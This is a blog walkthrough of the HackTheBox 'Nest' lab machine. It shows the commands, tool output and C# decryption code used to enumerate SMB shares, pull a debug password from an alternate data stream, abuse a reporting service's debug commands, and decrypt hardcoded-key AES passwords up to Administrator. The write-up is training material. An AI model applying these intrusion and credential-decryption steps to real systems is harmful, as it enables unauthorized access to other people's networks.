---
date: 2020-06-06 23:48:05
layout: post
title: HackTheBox Nest Writeup
subtitle: Hackthebox Nest Writeup.
description: >-
  in this blog i've explained how to solve Nest machine in hackthebox
image: https://i.ibb.co/j3VTc9b/Screenshot-2020-06-07-06-37-45.png
optimized_image: https://i.ibb.co/j3VTc9b/Screenshot-2020-06-07-06-37-45.png
category: hackthebox
tags:
  - hackthebox
  - Nest
author: Ahmed Fatouh
paginate: true
---


# []()Pwned:

[![Pwned](https://i.ibb.co/QKmrXxC/pwned.png)](https://asciinema.org/a/jvaVf5MDA6ifdNRbCK2ByCGIW)

# []()Methodology:

* **smb Enmeration**
* **Source Code Review**
* **.Net Developement**
* **Privilege Escalation**

# []()Nmap Scan:

as always, we will do nmap scan to know what is opened ports and it's services in this machine.

* i found 2 ports opened >> 445 and 4386 .

```ruby
xdev05@XDev05:~/Documents/HTB/Nest$ nmap -sC -sV -T4 -p- -Pn 10.10.10.178
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 06:58 EDT
Stats: 0:04:59 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 07:05 (0:01:51 remaining)
Nmap scan report for 10.10.10.178
Host is up (0.16s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.80%I=7%D=6/7%Time=5EDCC92C%P=x86_64-pc-linux-gnu%r(NUL
SF:L,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLine
SF:s,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised
SF:\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comman
SF:d\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n
SF:\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repor
SF:ting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"\
SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK\x
SF:20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows\x
SF:20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20the
SF:\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---\
SF:r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r\n
SF:DEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCookie
SF:,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessionRe
SF:q,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,21
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3A,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20c
SF:ommand\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20Re
SF:porting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n>");

Host script results:
|_clock-skew: -5h55m50s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-07T05:08:52
|_  start_date: 2020-06-06T18:10:48

```
# []()SMB Enumeration

after scanning, now we need to do some enumeration.

## []()SMBCLIENT:

* i used smbclient for smb enumeration "enum shares" and i found some credentials.

```ruby
smbclient -L \\10.10.10.178 -U ""
Enter WORKGROUP\'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available

```
* **here we have to shares we can access it >> Users and Data.** let's dig more.

* **now we want to enume the data in the smb shares**, let's go.

```ruby
smbclient \\\\10.10.10.178\\Data -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

		10485247 blocks of size 4096. 6545667 blocks available
smb: \> 
```
* here we go .

**Ater Some enumeration i found the TempUser Credentials in Txt File**.

![](https://i.ibb.co/b2RHPRV/tempuser.png)

```ruby
xdev05@XDev05:~/Documents/HTB/Nest$ smbclient  \\\\10.10.10.178\\Data -U TempUser
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019
cd 
		10485247 blocks of size 4096. 6545667 blocks available
smb: \> cd IT

```

* **but we can't read the user flag yet so we need to dig more.**

* **after some digging into the files i found dir which contain a file and in this file i found the encreypted password for c.smith user**.

![](https://i.ibb.co/jGdjYWX/smith.png)

## []()Decrypt C.SMITH Password

* after some enumeration and trying to decrypt the password i found some files that will help us to decrypt the password.

* in the **NotepadPlusPlus** I found a config file and this file help me to go to the VB Projects and this Projects we will use it for Decrypting the password.

```ruby

smb: \IT\Configs\> cd NotepadPlusPlus\
smb: \IT\Configs\NotepadPlusPlus\> ls
  .                                   D        0  Wed Aug  7 15:31:37 2019
  ..                                  D        0  Wed Aug  7 15:31:37 2019
  config.xml                          A     6451  Wed Aug  7 19:01:25 2019
  shortcuts.xml                       A     2108  Wed Aug  7 15:30:27 2019



```

* and here is the interested lines in the config file

```ruby

    </FindHistory>
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
</NotepadPlus>

```
* The file Temp.txt is contained within nested subfolders of the Secure$ share. Let's try to
recursively list the IT\Carl subfolder.

```ruby

smbclient  \\\\10.10.10.178\\Secure$ -U TempUser
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 19:08:12 2019
  ..                                  D        0  Wed Aug  7 19:08:12 2019
  Finance                             D        0  Wed Aug  7 15:40:13 2019
  HR                                  D        0  Wed Aug  7 19:08:11 2019
  IT                                  D        0  Thu Aug  8 06:59:25 2019
cd 
		10485247 blocks of size 4096. 6545667 blocks available
smb: \> cd IT/Carl
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

```
* downloaded all of this files 

```ruby

xdev05@XDev05:~/Documents/HTB/Nest$ cd VB\ Projects/
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects$ ls
Production  WIP
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects$ cd WIP/
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects/WIP$ ls
RU
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects/WIP$ cd RU/
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects/WIP/RU$ ls
RUScanner  RUScanner.sln
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects/WIP/RU$ cd RUScanner/
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects/WIP/RU/RUScanner$ ls
 bin            'My Project'         'RU Scanner.vbproj.user'
 ConfigFile.vb   obj                  SsoIntegration.vb
 Module1.vb     'RU Scanner.vbproj'   Utils.vb
xdev05@XDev05:~/Documents/HTB/Nest/VB Projects/WIP/RU/RUScanner$ 

```

* the utils.vb seems to be interested file.

```ruby

Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function




    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function






End Class

```
* The class contain methods for encrypting and decrypting passwords. We can use the
decryptString() function to decrypt the password gained earlier. As the code uses .NET
classes, it can be rewritten in any .NET based language. The code can be easily ported to C# and
compiled using mono on Linux. Mono is an open source implementation of the .NET framework.

* and here is the code:

```ruby 
using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
namespace Dec {
class Decryptor {
public static void Main() {
var pt = Decrypt("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=", "N3st22",
"88552299", 2, "464R5DFA5DL6LE28", 256);
Console.WriteLine("Plaintext: " + pt);
The code above contains the same Decrypt() method in C# format. The encrypted password is
passed to the Decrypt() method along with the other parameters found in Utils .
}
public static String Decrypt(String cipherText, String passPhrase, String
saltValue, int passwordIterations, String initVector,int keySize) {
var initVectorBytes = Encoding.ASCII.GetBytes(initVector);
var saltValueBytes = Encoding.ASCII.GetBytes(saltValue);
var cipherTextBytes = Convert.FromBase64String(cipherText);
var password = new Rfc2898DeriveBytes(passPhrase, saltValueBytes,
passwordIterations);
var keyBytes = password.GetBytes(keySize / 8);
var symmetricKey = new AesCryptoServiceProvider();
symmetricKey.Mode = CipherMode.CBC;
var decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes);
var memoryStream = new MemoryStream(cipherTextBytes);
var cryptoStream = new CryptoStream(memoryStream, decryptor,
CryptoStreamMode.Read);
var plainTextBytes = new byte[cipherTextBytes.Length];
var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0,
plainTextBytes.Length);
memoryStream.Close();
cryptoStream.Close();
var plainText = Encoding.ASCII.GetString(plainTextBytes, 0,
decryptedByteCount);
return plainText;
}
}
}

```
* The code above contains the same Decrypt() method in C# format. The encrypted password is
passed to the Decrypt() method along with the other parameters found in Utils .

* let's run the code with mono.

![](https://i.ibb.co/TTk8PMT/password.png)

* let's get our user flag.

```ruby

smbclient //10.10.10.178/Users -U c.smith
Enter WORKGROUP\c.smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

		10485247 blocks of size 4096. 6545667 blocks available
smb: \> cd C.Smith
smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019

		10485247 blocks of size 4096. 6545667 blocks available
smb: \C.Smith\> get user.get
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \C.Smith\user.get
smb: \C.Smith\> get user.txt
getting file \C.Smith\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \C.Smith\> 
```
![](https://i.ibb.co/ThXBNQx/flag.png)

# []()Privilege Escalation

* i found interested file in The HQK dir and we know that there is unknown running services in the machine and this is our point.

```ruby

smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

		10485247 blocks of size 4096. 6545539 blocks available
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
```
* download the debud mode file

```ruby 
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\> 
```

* and here is the password for debug mode : **WBQ201953D8w**

* i downloaded all the files in this directory.

* The XML file contains the following information.

```ruby

<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="h>
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>

```
* It appears to be a configuration file for the service running on port 4386 that we came across
earlier. Let's connect to this service.

```ruby 

xdev05@XDev05:~/Documents/HTB/Nest$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>


```
* this service allows us to run queries against a database.

```ruby 

debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available

```
* The DEBUG command gives us access to a few more commands, namely SERVICE , SESSION and
SHOWQUERY .

```ruby

setdir ../

Current directory set to Program Files
list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  Common Files
[DIR]  HQK
[DIR]  Internet Explorer
[DIR]  Uninstall Information
[DIR]  VMware
[DIR]  Windows Mail
[DIR]  Windows NT
[1]   desktop.ini

Current Directory: Program Files

```

* as we know, the interested file is the HQK.

```ruby

setdir HQK

Current directory set to HQK
list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml
```
* let's examine the LDAP file.

```ruby

setdir LDAP

Current directory set to LDAP
list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP

```
* let's run this Queries.

```ruby

runquery 2

Invalid database configuration found. Please contact your system administrator

```

* nothing

* let's examint what in it.

```ruby

showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

```


* nice! we catch the administrator password.

* Listing the LDAP folder reveals the binary we found earlier along with a file named Ldap.conf .
Running SHOWQUERY against the file returns the contents, which appears to contain an encrypted
password for the Administrator user. Let's decompile the HqkLdap.exe binary to and examine
the decryption logic.

* i will use dnspy in this point.

* A decompiler such as dnSpy can be used to view and debug the assembly. Import the binary into
dnSpy and expand the MainModule . The Main() method is found to read configuration from a
file passed through the command line.

![](https://i.ibb.co/mN2Ltmj/dnspy.png)

* The format is similar what we saw in Ldap.conf . It reads the encrypted password and calls the
CR.DS() method on it. Clicking on DS should navigate us to its definition.

![](https://i.ibb.co/HtQsHwq/dn.png)

* The DS() method takes in the encrypted password and then calls CR.RD() with a few
parameters.

![](https://i.ibb.co/PDbDMCh/dn2.png)

* The RD() method then decrypts the string and returns the plaintext. A quick comparison
between this method and one found in Utils.vb proves that they are the same. This means we
can re-use the code from earlier and just change the parameters.

* and here is the modified code 


```ruby

using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
namespace Dec {
class Decryptor {
public static void Main() {
var EncryptedString = "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=";
var pt = Decrypt(EncryptedString, "667912", "1313Rf99", 3,
"1L1SA61493DRV53Z", 256);
Console.WriteLine("Plaintext: " + pt);
}
public static String Decrypt(String cipherText, String passPhrase, String
saltValue, int passwordIterations, String initVector,int keySize) {
var initVectorBytes = Encoding.ASCII.GetBytes(initVector);
var saltValueBytes = Encoding.ASCII.GetBytes(saltValue);
var cipherTextBytes = Convert.FromBase64String(cipherText);
var password = new Rfc2898DeriveBytes(passPhrase, saltValueBytes,
passwordIterations);
var keyBytes = password.GetBytes(keySize / 8);
var symmetricKey = new AesCryptoServiceProvider();
symmetricKey.Mode = CipherMode.CBC;
var decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes);
var memoryStream = new MemoryStream(cipherTextBytes);
var cryptoStream = new CryptoStream(memoryStream, decryptor,
CryptoStreamMode.Read);
var plainTextBytes = new byte[cipherTextBytes.Length];
var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0,
plainTextBytes.Length);
memoryStream.Close();
cryptoStream.Close();
var plainText = Encoding.ASCII.GetString(plainTextBytes, 0,
decryptedByteCount);
return plainText;
}
}
}

```

* The Main() method is updated by copying the parameters from the decompiled assembly as
well as the encrypted password from Ldap.conf .

![](https://i.ibb.co/QM0Fjr1/admin.png)

* nice!
* now let's get root flag.

```ruby 

smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> dir
  .                                  DR        0  Sun Jan 26 02:20:50 2020
  ..                                 DR        0  Sun Jan 26 02:20:50 2020
  desktop.ini                       AHS      282  Sat Jan 25 17:02:44 2020
  root.txt                            A       32  Mon Aug  5 18:27:26 2019

		10485247 blocks of size 4096. 6545539 blocks available
smb: \Users\Administrator\Desktop\> 

```
### []()Root:

[![Root](https://i.ibb.co/L1hkbK7/root.png)](https://asciinema.org/a/JT44jqZCmWlvFkFA3VlENjeSz)


* there is another way to get administrator but i'll add it in another time.
* Thanks For Reading.

<script src="https://www.hackthebox.eu/badge/103789"></script>
